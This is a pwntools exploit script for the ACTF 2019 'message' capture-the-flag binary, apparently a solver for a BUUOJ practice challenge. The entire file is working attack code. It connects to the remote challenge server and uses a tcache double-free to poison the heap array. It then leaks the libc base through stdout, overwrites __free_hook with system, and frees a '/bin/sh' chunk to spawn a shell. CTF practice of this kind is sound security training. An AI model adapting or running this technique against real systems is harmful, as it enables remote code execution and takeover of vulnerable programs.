from pwn import *

#p = process('./ACTF_2019_message')
p = remote('node4.buuoj.cn', 25933)
elf = ELF('ACTF_2019_message')
libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def alloc(size, content):
    sla(b'choice: ', b'1')
    sla(b'message:', str(size).encode())
    sa(b'message:', content)

def delete(idx):
    sla(b'choice: ', b'2')
    sla(b'delete:', str(idx).encode())

def edit(idx, content):
    sla(b'choice: ', b'3')
    sla(b'edit:', str(idx).encode())
    sa(b'message:', content)

def show(idx):
    sla(b'choice: ', b'4')
    sla(b'display:', str(idx).encode())

heaparray = 0x602060
stdout = 0x602020

alloc(0x30, b'a') #0
alloc(0x30, b'/bin/sh\x00') #1
delete(0)
delete(0)

alloc(0x30, p64(heaparray)) #2
alloc(0x30, b'a') #3
alloc(0x30, p32(0x20) + p32(0) + p64(stdout)) #4

show(0)
ru(b'message: ')
libc_base = u64(rv(6) + b'\0\0') - libc.sym['_IO_2_1_stdout_']
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
success('libc_base -> 0x%x' % libc_base)

edit(4, p32(0x20) + p32(0) + p64(free_hook))
edit(0, p64(system))

delete(1)

p.interactive()